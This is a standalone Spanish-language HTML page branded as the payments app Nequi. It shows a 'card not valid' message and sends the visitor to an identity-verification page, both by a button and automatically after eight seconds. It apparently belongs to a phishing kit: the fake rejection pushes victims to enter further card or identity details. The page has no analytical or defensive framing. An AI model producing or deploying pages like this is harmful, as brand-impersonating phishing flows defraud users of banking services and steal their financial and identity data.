<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tarjeta rechazada - Nequi</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #200020;
    }
    .container {
      background: white;
      border-radius: 16px;
      padding: 40px 30px;
      text-align: center;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    .cross {
      width: 70px;
      height: 70px;
      background: #FF3E60;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      font-size: 36px;
      color: white;
    }
    h1 { font-size: 22px; margin-bottom: 12px; }
    p { font-size: 15px; color: #555; line-height: 1.5; margin-bottom: 24px; }
    .btn {
      background: #da0081;
      color: white;
      border: none;
      padding: 12px 28px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="cross">✕</div>
    <h1>Tarjeta no válida</h1>
    <p>No pudimos validar tu tarjeta.<br>Por favor intenta con otra o contacta a soporte.</p>
    <button class="btn" onclick="window.location.href='verificaciondeidentidad.html'">Intentar de nuevo</button>
  </div>

  <script>
    
    setTimeout(() => {
      window.location.href = 'verificaciondeidentidad.html';
    }, 8000);
  </script>
</body>
</html>
